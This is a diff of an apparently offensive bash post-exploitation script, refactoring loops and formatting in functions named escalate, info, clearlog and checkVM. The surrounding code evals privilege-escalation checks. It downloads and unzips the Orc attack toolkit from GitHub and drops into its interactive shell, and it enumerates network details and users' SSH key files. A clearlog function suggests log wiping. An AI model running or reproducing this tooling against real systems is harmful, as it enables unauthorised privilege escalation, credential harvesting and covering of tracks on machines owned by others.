@@ -198,13 +198,12 @@ escalate(){
 		"getcap -r / 2>/dev/null"
 		)
 
-		length=${#methods[@]}
-		for (( i=0; i<${length}; i++ ));
+		for method in "${!methods[@]}"
 			do
 			$? 2>/dev/null
-			eval "${methods[i]}"
+			eval "${methods[method]}"
 			if (("$?" == 0)); then
-			echo -e "${methods[i]}\n[*] Method Succeded [*]\n"
+			echo -e "${methods[method]}\n[*] Method Succeded [*]\n"
 			sleep 1
 			else
 			echo -e "[*] Method Failed! [*]\n"
@@ -263,9 +262,12 @@ escalate(){
 		wget -P $HOME https://github.com/zMarch/Orc/archive/master.zip 2>/dev/null
 		unzip -q $HOME/master.zip -d $HOME/Orc
 		cat <<-EOF
-		Dropping into Orc shell!
-		Check https://github.com/zMarch/Orc for commands and usage.
-		EOF
+
+			Dropping into Orc shell!
+
+			Check https://github.com/zMarch/Orc for commands and usage.
+
+			EOF
 		ENV=$HOME/Orc/Orc-master/o.rc sh -i
 		rm -rf $HOME/Orc
 	}
@@ -304,8 +306,8 @@ clearlog(){
 
 info(){
 	declare -a commands=(
-	"hostname -f;"
-	"ip addr show;"
+	"hostname -f"
+	"ip addr show"
 	"ip ro show"
 	"ifconfig -a"
 	"route -n"
@@ -354,12 +356,11 @@ info(){
 	"ls /home/*/.ssh/*"
 	)
 
-	length=${#commands[@]}
-	for (( i=0; i<${length}; i++ ));
+	for command in "${!commands[@]}"
 		do
 		$? 2>/dev/null
-		eval "${commands[i]}"
-		echo -e "\n\nRunning '${commands[i]}'\n"
+		eval "${commands[command]}"
+		echo -e "\n\nRunning '${commands[command]}'\n"
 		sleep 1
 	done
 	enter
@@ -368,9 +369,9 @@ info(){
 
 checkVM(){
 	if cat /proc/cpuinfo | grep -q "hypervisor"; then
-			echo -e "This system is a virtual machine\n"
+		echo -e "This system is a virtual machine\n"
 	else
-			echo -e "This system is not a virtual Machine\n"
+		echo -e "This system is not a virtual Machine\n"
 	fi
 	enter
 }
